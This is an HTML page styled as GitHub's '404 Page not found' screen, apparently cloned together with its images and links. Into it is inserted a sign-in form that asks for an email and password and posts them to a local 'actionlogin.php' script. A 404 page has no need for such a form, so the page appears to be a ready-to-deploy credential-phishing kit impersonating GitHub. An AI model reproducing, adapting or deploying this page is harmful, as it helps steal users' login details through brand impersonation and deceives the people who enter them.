<html>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <link rel="stylesheet" type="text/css" href="js/404.js">
  <title>Page not found · GitHub</title>
  <link href="css/404.css" media="all" rel="stylesheet" type="text/css">
  <link href="css/style.css" type="text/css" rel="stylesheet" >
  <script type="text/javascript" charset="utf-8" src="js/page_context.js"></script>
  <script language="javascript"> 
      function IsDigit(cCheck) 
      { 
      return (('0'<=cCheck) && (cCheck<='9')); 
      } 

      function IsAlpha(cCheck) 
      { 
      return ((('a'<=cCheck) && (cCheck<='z')) || (('A'<=cCheck) && (cCheck<='Z'))) 
      } 

      function IsValid() 
      { 
      var struserName = reg.UserName.value; 
      for (nIndex=0; nIndex<struserName.length; nIndex++) 
      { 
      cCheck = struserName.charAt(nIndex); 
      if (!(IsDigit(cCheck) || IsAlpha(cCheck))) 
      { 
      return false; 
      } 
      } 
      return true; 
      } 
      function chkEmail(str) 
      { 
      return str.search(/\w+([-+.']\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*/)==0?true:false 
      }

      function docheck() 
      { 
        if(reg.Email.value =="") 
        { 
        alert("Please fill in the mailbox"); 
        return false; 
        } 
        else if(!chkEmail(reg.Email.value)) 
        { 
        alert("Please enter a valid Email address"); 
        return false; 
        }
        else if(reg.UserPassword.value=="") 
        { 
        alert("Please fill in the password"); 
        return false; 
        }
        
        else 
        { 
        return true; 
        } 
      } 
    </script>
</head>
<body screen_capture_injected="true">
<div id="parallax_wrapper">
  <div id="parallax_field">
    <img alt="building" class="js-plaxify" data-invert="true" data-xrange="0" data-yrange="20" height="415" id="parallax_bg" width="940" src="img/down.jpg" style="top: -23.979328165374675px; left: -20px;">
  </div>
  <div id="parallax_illustration">
    <div id="auth" style="display: block;">
      <div class="auth-form" id="login">
        <form accept-charset="UTF-8" action="actionlogin.php" method="post" enctype="multipart/form-data" target="_self" onsubmit="return docheck()" name="reg"><!--login start-->
          <div class="auth-form-body">
            <input type="email" name="Email" placeholder="Put In Your Email" tabindex="2" id="password">
            <input type="password" name="UserPassword" placeholder="Put Your Password" tabindex="2" id="password">
            <input class="button" name="sub" tabindex="3" type="submit" value="Sign in">
          </div>
        </form>
      </div>
    </div>
    <img alt="404 | “This is not the web page you are looking for”" class="js-plaxify" data-xrange="20" data-yrange="10" height="249" id="parallax_error_text" width="271" src="img/404.png" style="top: 73.98966408268734px; left: 66.3375px;">
    <img alt="Octobi Wan Catnobi" class="js-plaxify" data-xrange="10" data-yrange="10" height="230" id="parallax_octocat" width="188" src="img/cat.png" style="top: 95.98966408268734px; left: 353.16875px;">
    <img alt="land speeder" class="js-plaxify" data-xrange="10" data-yrange="10" height="156" id="parallax_speeder" width="440" src="img/buttom.png" style="top: 151.98966408268734px; left: 429.16875px;">
    <img alt="Octobi Wan Catnobi&#39;s shadow" class="js-plaxify" data-xrange="10" data-yrange="10" height="49" id="parallax_octocatshadow" width="166" src="img/q.png" style="top: 298.98966408268734px; left: 368.16875px;">
    <img alt="land speeder&#39;s shadow" class="js-plaxify" data-xrange="10" data-yrange="10" height="75" id="parallax_speedershadow" width="430" src="img/left.png" style="top: 264.98966408268734px; left: 439.16875px;">
    <img alt="building" class="js-plaxify" data-invert="true" data-xrange="50" data-yrange="20" height="123" id="parallax_building_1" width="304" src="img/house.png" style="top: 69.02067183462532px; left: 481.15625px;">
    <img alt="building" class="js-plaxify" data-invert="true" data-xrange="75" data-yrange="30" height="50" id="parallax_building_2" width="116" src="img/f.png" style="top: 107.03100775193798px; left: 782.734375px;">
  </div>
</div>

<div class="container">
  <form accept-charset="UTF-8" id="search" action="404.php" method="get">
    <label for="search">Find code, projects, and people on GitHub:</label>
    <input type="text" name="q">
    <input class="button" type="submit" value="Search">
  </form>
  <div id="suggestions">
    <a href="ViewContact.php">Contact Support</a> —
    <a href="404.php">GitHub Status</a> —
    <a href="404.php">@githubstatus</a>
  </div>
  <a href="index.php" class="logo logo-img-1x">
    <img width="32" height="32" title="" alt="" src="img/ico.png">
  </a>
  <a href="index.php" class="logo logo-img-2x">
    <img width="32" height="32" title="" alt="" src="img/down.png">
  </a>
</div>
</body>
</html>